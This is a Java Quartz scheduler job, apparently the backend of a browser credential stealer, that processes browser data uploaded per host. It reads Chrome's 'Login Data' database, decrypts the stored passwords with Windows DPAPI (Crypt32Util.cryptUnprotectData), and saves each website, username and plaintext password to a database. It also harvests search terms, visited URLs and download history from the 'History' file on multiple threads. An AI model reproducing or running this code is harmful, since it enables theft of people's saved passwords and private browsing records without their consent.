package com.jimmy.infaction.job;

import com.jimmy.infaction.common.*;
import com.jimmy.infaction.pojo.*;
import com.jimmy.infaction.service.BrowserDownloadService;
import com.jimmy.infaction.service.BrowserKeywordService;
import com.jimmy.infaction.service.BrowserService;
import com.jimmy.infaction.service.BrowserUrlService;
import com.sun.jna.platform.win32.Crypt32Util;
import org.quartz.Job;
import org.quartz.JobExecutionContext;
import org.quartz.JobExecutionException;
import org.quartz.SchedulerException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.context.ApplicationContext;


import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * @author jimmy on 2019/9/26 17:50
 */
public class DeBagJob  implements  Job {
	private static Logger log = LoggerFactory.getLogger(DeBagJob.class);
//	@Autowired
//	private BrowserService browserService;
	@Override
	public void execute(JobExecutionContext jobContext) throws JobExecutionException {
		ApplicationContext applicationContext=null;
		try {
			//get sping context
			applicationContext=getApplicationContext(jobContext);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		//find xml register beanservice
		BrowserService browserService = (BrowserService) applicationContext.getBean("browserService");
		BrowserDownloadService browserDownloadService = (BrowserDownloadService) applicationContext.getBean("browserDownloadService");
		BrowserKeywordService browserKeywordService = (BrowserKeywordService) applicationContext.getBean("browserKeywordService");
		BrowserUrlService browserUrlService = (BrowserUrlService) applicationContext.getBean("browserUrlService");
		String rootPath = "F:\\workspace\\infaction\\upload\\";
		File dir = new File(rootPath);
		File[] files = dir.listFiles();
		for (File f : files) {
			if (!(f.getName().matches(".*.zip"))) {
				for (File ff : f.listFiles()) {
					try {
						switch (ff.getName()){
							case "Login Data":
								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"\\"+"Login Data");
								List<SqlLiteDemoResult> demoList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
								for (SqlLiteDemoResult result : demoList) {
									Browser browser = new Browser();
									browser.setWebsite(result.getAction_url());
									browser.setHostid(f.getName());
									browser.setUser(result.getUsername_value());
									browser.setPassword(new String(Crypt32Util.cryptUnprotectData(result.getPassword_value())));
									browserService.insert(browser);
								}
							case "History":
								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"\\"+"History");
								int num = 10; //初始线程数
								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
								int klength = HkList.size();
								int kbaseNum = klength / num;
								int kremainderNum = klength % num;
								int kend = 0;
								for (int i = 0; i < num; i++) {
									int start = kend;
									kend = start + kbaseNum;
									if (i == (num - 1)) {
										kend = klength;
									} else if (i < kremainderNum) {
										kend = kend + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HkList, start, kend, f.getName(), browserKeywordService);
									thread.start();
								}
								List<HistoryUrlResult> HList = hi.executeQueryList("Select url, title, visit_count FROM urls", HistoryUrlResult.class);
								int length = HList.size();
								int baseNum = length / num;
								int remainderNum = length % num;
								int end = 0;
								for (int i = 0; i < num; i++) {
									int start = end;
									end = start + baseNum;
									if (i == (num - 1)) {
										end = length;
									} else if (i < remainderNum) {
										end = end + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HList, start, end, f.getName(),browserUrlService);
									thread.start();
								}
								List<HistoryDownloadResult> HdList = hi.executeQueryList("Select  current_path,tab_url FROM downloads", HistoryDownloadResult.class);
								int dlength = HdList.size();
								if(num > dlength){
									num = dlength;
								}
								int dbaseNum = dlength / num;
								int dremainderNum = dlength % num;
								int dend = 0;
								for (int i = 0; i < num; i++) {
									int start = dend;
									dend = start + dbaseNum;
									if (i == (num - 1)) {
										dend = dlength;
									} else if (i < dremainderNum) {
										dend = dend + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HdList, start, dend, f.getName(),browserDownloadService);
									thread.start();
								}
//								System.out.println("----"+(System.currentTimeMillis() - start));
							case "Cookies":
//								System.out.println(ff.getName());
							default:
								continue;
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
//					ff.delete();
				}
			}
		}
	}
	private static final String APPLICATION_CONTEXT_KEY = "applicationContextKey";
	private ApplicationContext getApplicationContext(JobExecutionContext jobContext) throws SchedulerException {
		ApplicationContext appCtx = null;
		appCtx = (ApplicationContext) jobContext.getScheduler().getContext().get(APPLICATION_CONTEXT_KEY);
		if (appCtx == null) {
			throw new JobExecutionException("No application context available in scheduler context for key \"" + APPLICATION_CONTEXT_KEY + "\"");
		}
		return appCtx;
	}
	class ExecMultiBag extends Thread{
		private String threadName;
		private List<HistoryKeyResult> hklist ;
		private List<HistoryUrlResult> hllist ;
		private List<HistoryDownloadResult> hdlist ;
		private BrowserUrlService browserUrlService;
		private BrowserDownloadService browserDownloadService;
		private BrowserKeywordService browserKeywordService;
		private int startIndex;
		private int endIndex;
		private String hostid ;
		public  ExecMultiBag(String threadName,List list,int startIndex, int endIndex, String hostid,Object service){
			this.threadName = threadName;
			this.hostid = hostid;
			this.startIndex = startIndex;
			this.endIndex = endIndex;
			if (list.toString().matches("(.*)KeyResult(.*)")){
				this.hklist = list;
				this.browserKeywordService = (BrowserKeywordService) service;
			}else if(list.toString().matches("(.*)UrlResult(.*)")) {
				this.hllist = list;
				this.browserUrlService = (BrowserUrlService) service;
			}else if(list.toString().matches("(.*)DownloadResult(.*)")) {
				this.hdlist = list;
				this.browserDownloadService = (BrowserDownloadService) service;
			}
		}

		@Override
		public void run() {
			if (null != hklist) {
				List<HistoryKeyResult> kList = hklist.subList(startIndex, endIndex);
//				System.out.println(threadName + "处理了" + kList.size() + "条！startIndex:" + startIndex + "|endIndex:" + endIndex);
				for (HistoryKeyResult result : kList) {
					Browser_keyword browser_keyword = new Browser_keyword();
					browser_keyword.setKey(result.getKey());
					browser_keyword.setHostid(hostid);
					browserKeywordService.insert(browser_keyword);
				}
			} else if (null != hllist) {
				List<HistoryUrlResult> lList = hllist.subList(startIndex, endIndex);
//				System.out.println(threadName + "处理了" + lList.size() + "条！startIndex:" + startIndex + "|endIndex:" + endIndex);
				for (HistoryUrlResult result : lList) {
					Browser_url browser_url = new Browser_url();
					browser_url.setWebsite(result.getWebsite());
					browser_url.setTitle(result.getTitle());
					browser_url.setVisit(result.getVisit());
					browser_url.setHostid(hostid);
					browserUrlService.insert(browser_url);
				}
			} else if (null != hdlist) {
				List<HistoryDownloadResult> dList = hdlist.subList(startIndex, endIndex);
//				System.out.println(threadName + "处理了" + dList.size() + "条！startIndex:" + startIndex + "|endIndex:" + endIndex);
				for (HistoryDownloadResult result : dList) {
					Browser_download browser_download = new Browser_download();
					browser_download.setUrl(result.getTab_url());
					browser_download.setPath(result.getCurrent_path());
					browser_download.setHostid(hostid);
					browserDownloadService.insert(browser_download);
				}
			}
		}
	}
//	class ExecMultiBag implements  Runnable{
//		private List<HistoryKeyResult> hklist ;
//		private BrowserKeywordService browserKeywordService = null;
//		private String name ;
//		public ExecMultiBag(List<HistoryKeyResult> hkList, BrowserKeywordService browserKeywordService, String name) {
//			 this.hklist = hkList;
//			 this.browserKeywordService = browserKeywordService;
//			 this.name = name;
//
//		}
//
//		@Override
//		public void run() {
//			if(null!=hklist){
//				for (HistoryKeyResult result : hklist) {
//					Browser_keyword browser_keyword = new Browser_keyword();
//					browser_keyword.setKey(result.getKey());
//					browser_keyword.setHostid(name);
//					browserKeywordService.insert(browser_keyword);
//				}
//			}
//		}
//	}
}

